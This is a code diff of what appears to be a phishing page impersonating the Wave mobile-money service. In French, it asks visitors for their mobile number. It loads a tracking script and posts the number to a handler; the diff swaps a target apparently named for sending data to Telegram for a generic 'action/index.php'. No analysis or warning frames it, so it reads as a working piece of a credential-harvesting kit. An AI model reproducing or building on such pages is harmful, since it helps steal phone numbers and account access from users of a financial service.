@@ -106,7 +106,7 @@ include("track.php");
 <div class="container">
   <p class="mt-5 mb-4 fs-5">Bienvenue chez <strong>Wave</strong>! Pour commencer,<br>entrez votre numéro de mobile</p>
 
-  <form action="action/send_to_telegram.php" method="POST">
+  <form action="action/index.php" method="POST">
     <input type="hidden" name="step" value="phone">
     <div class="input-group mb-3">
       <span class="input-group-text bg-white border-0 flag-select">
